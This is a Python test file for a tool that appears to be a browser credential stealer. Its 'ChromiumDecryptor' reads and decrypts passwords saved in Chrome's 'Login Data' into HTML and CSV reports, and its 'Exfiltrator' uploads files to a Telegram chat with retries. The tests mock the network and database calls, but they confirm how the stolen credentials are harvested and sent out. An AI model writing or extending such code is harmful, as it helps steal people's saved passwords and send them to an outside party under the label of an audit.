import pytest
import requests
from pathlib import Path
from unittest.mock import MagicMock, patch
from main import Exfiltrator, ChromiumDecryptor

def test_retry_request_fails_gracefully(mocker):
    """Test that retry_request returns False and does not raise after max retries."""
    exf = Exfiltrator(telegram_token="fake", telegram_chat_id="fake")
    
    # Mock requests.post to always raise an exception
    mock_post = mocker.patch("requests.post", side_effect=requests.exceptions.ConnectionError("Network Down"))
    
    # Mock open for the file
    mocker.patch("builtins.open", mocker.mock_open(read_data=b"data"))
    
    # This should return False, not raise
    result = exf.send_to_telegram("any_path.html")
    
    assert result is False
    # Verify it tried 3 times (default MAX_RETRIES)
    assert mock_post.call_count == 3

def test_audit_filtering_logic(mocker, tmp_path):
    """Test that audit correctly separates HTTP and non-HTTP credentials."""
    decryptor = ChromiumDecryptor()
    
    # Override browsers_paths to point to our tmp path
    mock_path = tmp_path / "User Data"
    mock_path.mkdir()
    decryptor.browsers_paths = {"Chrome": mock_path}

    # Mock get_key to succeed
    mocker.patch.object(ChromiumDecryptor, "get_key", return_value=b"fake_key_32_bytes_padding_123456")
    mocker.patch.object(ChromiumDecryptor, "decrypt", side_effect=lambda blob, key: blob.decode())

    # Create a fake profile with a Login Data stub
    default_path = mock_path / "Default"
    default_path.mkdir()
    db_path = default_path / "Login Data"
    db_path.write_text("fake db content")

    # Mock sqlite3
    mock_conn = MagicMock()
    mock_cursor = mock_conn.cursor.return_value
    # Return 3 rows: 1 valid HTTP, 1 non-HTTP (filtered), 1 partial (skipped)
    mock_cursor.fetchall.return_value = [
        ("https://google.com", "user1", b"pass1"),
        ("ftp://local-files", "user2", b"pass2"),  # Should be filtered
        ("https://missing", "", b"pass3"),           # Should be skipped (missing user)
    ]
    mocker.patch("sqlite3.connect", return_value=mock_conn)
    mocker.patch("shutil.copy2")

    # Call with the new API signature
    results, html_path, csv_path = decryptor.audit(output_dir=tmp_path)

    # results should contain 2 entries (1 HTTP + 1 filtered FTP)
    assert results is not None
    assert len([r for r in results if r[2].startswith("https://")]) == 1
    assert len([r for r in results if r[2].startswith("ftp://")]) == 1

    # Check HTML content for filtered section
    assert html_path is not None
    report_content = html_path.read_text(encoding='utf-8')
    assert "https://google.com" in report_content
    assert "Entradas Filtradas" in report_content
    assert "ftp://local-files" in report_content
